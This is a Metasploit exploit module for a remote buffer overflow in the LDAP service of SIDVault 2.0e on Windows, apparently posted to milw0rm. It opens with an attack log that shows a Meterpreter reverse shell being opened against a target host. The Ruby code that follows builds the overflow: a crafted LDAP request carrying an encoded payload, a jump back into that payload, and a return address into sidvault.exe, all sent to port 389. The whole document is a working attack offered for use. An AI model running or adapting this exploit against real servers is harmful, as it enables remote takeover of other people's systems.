#--attack-log--
#attacker@dz-labs:~/pentests/metasploit/framework-3.2/trunk$ ./msfcli exploit/windows/ldap/sidvault_ldap #PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.2 RHOST=192.168.1.3 E
#[*] Please wait while we load the module tree...
#[*] Handler binding to LHOST 0.0.0.0
#[*] Started reverse handler
#[*] Sending stage (718336 bytes)
#[*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.3:1076)

#meterpreter >


##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'SIDVault 2.0e Windows Remote Buffer Overflow',
			'Description'    => %q{
				This exploits a buffer overflow in the LDAP service that is
				part of the SIDVault product. This module was tested against
				version 2.0e.
					
			},
			'Author' 	 => [ 'His0k4 <his0k4.hlm[at]gmail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://www.milw0rm.com/exploits/9586'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =>  'True',
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					#Tested against xp_sp3 OK
					["Universal",   { 'Ret' => "\x29\x10\x40" }], #p/p/r sidvault.exe
				],
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(389)
				], self.class)
	end

	def exploit
		connect
		
		sploit = "\x30\x82\x12\x10\x02\x01\x01\x60\x82\x12\x09\x02\x01\x03\x04\x82\x10\xfe"	
		sploit << "dc="	
		sploit << rand_text_alpha(1028)
		sploit << payload.encoded
		sploit << rand_text_alpha(3302 - payload.encoded.length)
		sploit << "\xE8\x15\xF3\xFF\xFF"
		sploit << make_nops(5)
		sploit << "\xEB\xF4\x90\x90"
		sploit << target.ret
		sploit << "\x80\x82\x01\x00"
		sploit << rand_text_alpha(500)
		
		sock.put(sploit)
		
		handler
	end

end

# milw0rm.com [2009-09-04]
